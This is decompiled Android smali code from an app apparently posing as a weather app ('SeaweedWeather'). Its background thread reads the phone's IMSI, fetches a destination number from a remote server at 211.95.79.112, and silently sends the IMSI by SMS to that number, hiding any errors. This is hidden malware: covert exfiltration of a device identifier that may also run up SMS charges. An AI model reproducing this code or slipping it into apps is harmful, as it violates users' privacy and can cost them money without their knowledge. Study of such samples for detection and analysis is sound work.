.class Lcom/picvision/seaweedweather/main$1$6;
.super Ljava/lang/Thread;
.source "main.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/picvision/seaweedweather/main$1;->handleMessage(Landroid/os/Message;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lcom/picvision/seaweedweather/main$1;


# direct methods
.method constructor <init>(Lcom/picvision/seaweedweather/main$1;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/picvision/seaweedweather/main$1$6;->this$1:Lcom/picvision/seaweedweather/main$1;

    .line 450
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/4 v9, 0x0

    .line 454
    iget-object v3, p0, Lcom/picvision/seaweedweather/main$1$6;->this$1:Lcom/picvision/seaweedweather/main$1;

    invoke-static {v3}, Lcom/picvision/seaweedweather/main$1;->access$0(Lcom/picvision/seaweedweather/main$1;)Lcom/picvision/seaweedweather/main;

    move-result-object v3

    const-string v5, "phone"

    invoke-virtual {v3, v5}, Lcom/picvision/seaweedweather/main;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 455
    .local v8, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v6

    .line 456
    .local v6, "imsi":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .line 458
    .local v0, "smsManger":Landroid/telephony/gsm/SmsManager;
    new-instance v7, Landroid/content/Intent;

    iget-object v3, p0, Lcom/picvision/seaweedweather/main$1$6;->this$1:Lcom/picvision/seaweedweather/main$1;

    invoke-static {v3}, Lcom/picvision/seaweedweather/main$1;->access$0(Lcom/picvision/seaweedweather/main$1;)Lcom/picvision/seaweedweather/main;

    move-result-object v3

    const-class v5, Lcom/picvision/seaweedweather/utils/SMSReceiver;

    invoke-direct {v7, v3, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 459
    .local v7, "itSend":Landroid/content/Intent;
    const-string v3, "SEND_INFOR"

    invoke-virtual {v7, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 460
    iget-object v3, p0, Lcom/picvision/seaweedweather/main$1$6;->this$1:Lcom/picvision/seaweedweather/main$1;

    invoke-static {v3}, Lcom/picvision/seaweedweather/main$1;->access$0(Lcom/picvision/seaweedweather/main$1;)Lcom/picvision/seaweedweather/main;

    move-result-object v3

    invoke-virtual {v3}, Lcom/picvision/seaweedweather/main;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v9, v7, v9}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 461
    .local v4, "mSendPI":Landroid/app/PendingIntent;
    const-string v3, "http://211.95.79.112/getSMSnumber.jsp"

    invoke-static {v3}, Lcom/picvision/seaweedweather/utils/Util;->makeSureUpdate(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 464
    .local v1, "number":Ljava/lang/String;
    :try_start_0
    iget-object v3, p0, Lcom/picvision/seaweedweather/main$1$6;->this$1:Lcom/picvision/seaweedweather/main$1;

    invoke-static {v3}, Lcom/picvision/seaweedweather/main$1;->access$0(Lcom/picvision/seaweedweather/main$1;)Lcom/picvision/seaweedweather/main;

    move-result-object v3

    invoke-static {v3}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v5, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "SEND_CENTER_CODE"

    invoke-virtual {v5, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v9, 0x0

    invoke-interface {v3, v5, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 465
    .local v2, "SEND_CENTER_CODE":Ljava/lang/String;
    const-string v3, "imsi:#,software:SeaweedWeatherV1.0.0_FREE_AD1.5_AllSizes"

    const-string v5, "#"

    invoke-virtual {v3, v5, v6}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 468
    .end local v2    # "SEND_CENTER_CODE":Ljava/lang/String;
    :goto_0
    return-void

    .line 466
    :catch_0
    move-exception v3

    goto :goto_0
.end method
